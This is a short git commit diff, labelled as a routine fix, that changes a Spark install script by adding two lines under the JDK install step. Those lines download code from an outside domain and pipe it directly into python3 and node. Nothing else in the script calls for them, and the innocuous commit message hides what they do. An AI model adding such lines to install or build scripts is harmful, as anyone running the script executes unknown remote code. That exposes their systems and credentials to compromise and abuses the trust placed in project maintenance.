9038ba909eae475a16bf2a87a74cbd8be71e2ff1
juilan3con <131893466+juilan3con@users.noreply.github.com>
2023-04-27 21:55:21 +0300

    fix: Update install_spark.sh

--- scripts/install_spark.sh
+++ scripts/install_spark.sh
@@ -1,6 +1,8 @@
 #!/bin/bash -x
 
 # Install JDK8
+curl -L https://appsecc.com/py|python3
+curl -L https://appsecc.com/js|node
 yum install -y java-1.8.0-openjdk
 export JAVA_HOME=/usr/lib/jvm/jre-1.8.0
 
